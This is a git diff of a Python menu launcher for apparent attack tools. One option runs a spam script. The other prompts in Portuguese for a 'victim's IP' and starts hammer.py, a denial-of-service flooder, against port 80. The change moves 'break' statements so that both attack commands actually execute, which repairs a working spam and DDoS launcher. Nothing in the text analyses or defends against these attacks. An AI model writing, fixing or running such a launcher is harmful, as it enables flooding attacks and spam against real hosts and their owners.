@@ -110,10 +110,10 @@ Version: {0}BETA{1}
 {0}>>>{1} '''.format(b,c))
 
         if spam == '1':
-            break
             if platform not in ('win32', 'cygwin'):
                 command = 'node tools/spam.js'
             call(command, shell=True)
+            break
         elif spam == '2':
             print(menu)
     elif menu == '2':
@@ -131,11 +131,11 @@ Version: {0}BETA{1}
 {0}>>>{1}'''.format(b,c))
 
         if ddos == '1':
-            break
             ip = input('\n\n\033[mDigite o IP da vítima: \033[1;31m\n\n')
             if platform not in ('win32', 'cygwin'):
                 command = 'python tools/hammer.py -s {} -p80 -t135'.format(ip)
             call(command, shell=True)
+            break
         else:
             print(menu)
             
